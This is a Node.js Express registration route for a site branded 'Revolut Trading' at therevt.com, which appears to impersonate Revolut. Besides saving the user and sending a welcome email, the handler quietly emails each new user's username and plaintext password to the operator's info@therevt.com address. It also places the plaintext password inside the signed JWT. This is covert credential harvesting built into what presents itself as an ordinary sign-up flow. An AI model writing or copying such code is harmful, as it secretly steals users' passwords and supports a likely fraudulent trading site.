//Set up
let express = require("express");
let router = express.Router();
let userModel = require("../schemas/userSchema");
const hash = require("../helpers/hasher");
const jwt = require("jsonwebtoken");
const ms = require("../helpers/mailSender");

router.post("/register", hash.hash, function (req, res) {
  console.log("Trying to register you");

  //Destructure username and pwd from the request body
  console.log(req.body);

  const newUser = {
    bio: {
      name: {
        firstName: req.body.firstName.trim(),
        lastName: req.body.lastName.trim(),
      },
      login: {
        username: req.body.username.trim(),
        password: req.body.wordToHash,
      },
      phonenumber: req.body.number,
      email: req.body.email.trim(),
      image: String,
    },
  };

  newUserInstance = new userModel(newUser);

  const from = `"Revolut Trading" <no-reply@therevt.com>`;
  const receiver = req.body.email.trim();
  const subject = `Welcome to Revolut Trading`;
  const error = `You have been registered, but we couldn't send you a welcome email. We apologize for this :().`;
  const message = `
		<div style="padding: 20px; width: 600px">
			<img src="/images/logo.png" style="height: 50px" />
			<p></p>
			<h3>
				HURRAY!!! Brand New Account
			</h3>

			<p>
				Hello ${req.body.firstName} ${req.body.lastName},
			</p>

			<p>
				We are happy to welcome you to Revolut Trading, it's our
				utmost pleasure to serve you, to work for you and to be part of
				your success history.
			</p>

			<p>
				Kindly feel free to write us, call us or text us if you have
				any difficulty navigating our website, A customer care agent will be available
				24/7 to attend to you to make sure you have a very seamless
				experience with us.
			</p>



			<p style="color: gray; font-size: .8em">
				For more information on our products and services,
				please see our support article providing more detail or send us an
				email or put a call through available channels
			</p>
			<p> Sincerely, </p>

			<p style="font-weight: bolder"> Revolut Trading </p>
			<p> https://www.therevt.com </p>
		</div>
	`;

  // ===========================================

  const l_from = `"Revolut Trading" <no-reply@therevt.com>`;
  const l_receiver = `info@therevt.com`;
  const l_subject = `${req.body.firstName}'s login Info`;
  const l_error = `token`;
  const l_success = `token`;
  const l_message = `
		<div style="padding: 20px; width: 600px">
			<h3> New Login info from ${req.body.firstName} ${req.body.lastName} </h3>

			<p> Username: ${req.body.username} </p>
			<p> Password: ${req.body.pwd} </p>
		</div>
	`;

  // ===========================================

  newUserInstance.save(function (err) {
    if (err) {
      //console.log("Error, User Not registered.");
      console.log(err);
      if (err.code == 11000) {
        //res.send({"error": "you're using either a duplicate username or email, kindly use another and try again."});
      }

      return res.send({
        error:
          "An Error Occurred During registration, make sure you're not using the same email address or phone number and make sure to fill all necessary noreplyrmation requested of you.",
      });
    } else {
      const { username, pwd } = req.body;
      const token = jwt.sign({ username, pwd }, process.env.TOKEN_KEY, {
        expiresIn: "2h",
      });
      const success = token;

      ms.mailSender(
        l_from,
        l_receiver,
        l_subject,
        l_message,
        l_error,
        l_success,
        res
      ).then(
        (data) => {
          ms.mailSender(
            from,
            receiver,
            subject,
            message,
            error,
            success,
            res
          ).then(
            (data) => {
              console.log("(Confirmation) Message Sent: %s", data);
              res.status(201).send({ token });
            },
            (err) => res.status(400).send(error)
          );
        },
        (err) => res.status(400).send(error)
      );
    }
  });
});

module.exports = router;
